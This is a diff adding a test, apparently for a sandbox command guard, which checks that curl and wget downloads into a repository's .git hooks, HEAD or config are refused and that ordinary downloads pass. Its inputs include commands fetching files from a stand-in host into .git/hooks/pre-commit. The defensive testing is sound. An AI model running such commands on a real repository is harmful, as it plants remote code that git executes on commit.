@@ -84,6 +84,14 @@ test("the pad of the branches this worktree's git made is written by git alone",
   expect(sharedRefusal("git diff --output=/r/wt/out.patch", s.root, "/home/u", s)).toBeNull();
 });
 
+test("a download written into git's own files is a write of them, as a redirect is", () => {
+  for (const line of [
+    "curl -o /r/.git/hooks/pre-commit https://h.example/x", "curl -sLo /r/.git/hooks/pre-commit https://h.example/x", "curl --output=/r/.git/HEAD https://h.example/x", "wget -O /r/.git/hooks/pre-commit https://h.example/x",
+    "wget -qO/r/.git/config https://h.example/x", "wget -P /r/.git/hooks https://h.example/pre-commit", "curl -O --output-dir /r/.git/hooks https://h.example/pre-commit",
+  ]) expect([line, sharedRefusal(line, s.root, "/home/u", s) !== null]).toEqual([line, true]);
+  for (const line of ["curl -o /r/wt/out.txt https://h.example/x", "wget -qO- https://h.example/x", "curl -s https://h.example/x -o /dev/null"]) expect([line, sharedRefusal(line, s.root, "/home/u", s)]).toEqual([line, null]);
+});
+
 test("a command does not write the other object stores git reads, nor make a link in the shared git data", () => {
   for (const line of [
     "echo /elsewhere/objects > /r/.git/objects/info/alternates",
